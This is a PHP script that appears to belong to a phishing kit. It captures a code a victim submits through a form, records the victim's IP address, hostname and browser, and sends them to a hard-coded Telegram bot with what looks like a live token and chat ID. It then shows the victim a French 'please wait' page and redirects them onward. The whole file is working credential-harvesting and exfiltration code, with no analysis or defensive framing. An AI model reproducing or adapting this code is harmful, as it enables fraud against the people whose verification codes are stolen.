<?php

session_start();


send_info();

function send_info()
{

    $error = '';

    if (isset($_POST)) {

        $valid = 1;

        if ($valid == 1) {


            $ip = $_SERVER['REMOTE_ADDR'];

            $message = "--------------------code-------------------\n";

            $message .= " code       :  " . $_POST['responselecteur'] . " \n";


            $message .= "IP      : $ip\n";
            $message .= "HOST    : " . gethostbyaddr($ip) . "\n";


            $message .= "BROWSER : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
            $message .= "----------------------   ---------------------\n";

            $msg = '<img id="img-spinner" src="img/spinner.gif" alt="Your transaction is being processed"><br>Veuillez patientez quelques instant...  ';

            if (!response($ip, $msg)) echo "erreur";



            file_get_contents("https://api.telegram.org/bot6936015326:AAExD5-5foAfYSx7n-0kWfBC_vmopO92ro4/sendMessage?chat_id=6964453824&text=" . urlencode($message) . "&parse_mode=html");

            $_SESSION["msg"] = $message;
            
            $params = base64_encode("ip=" . $ip);


            header('Location:' . $_SESSION["url"] . 'validation.php?parameters=' . $params);
            return;
        } else {
            echo 'erreur';
        }

        header('Location:./index.php');
    } else {

        header('Location:index.php');
    }
}


function response($ip, $msg)
{
    $path = './data/' . $ip . '.php';

    // Open the file for writing (create if it doesn't exist)
    $file = fopen($path, 'w');

    // Check if the file was opened successfully
    if (!$file) {
        echo 'File could not be opened';
        // exit;
        return false;
    }

    // Write the message to the file
    $bytesWritten = fwrite($file, $msg);

    // Close the file
    fclose($file);

    // Check if writing to the file was successful
    if ($bytesWritten === false) {
        echo 'File could not be updated';
        return false;
    } else {
        echo 'File has been updated!';
        return true;
    }
}
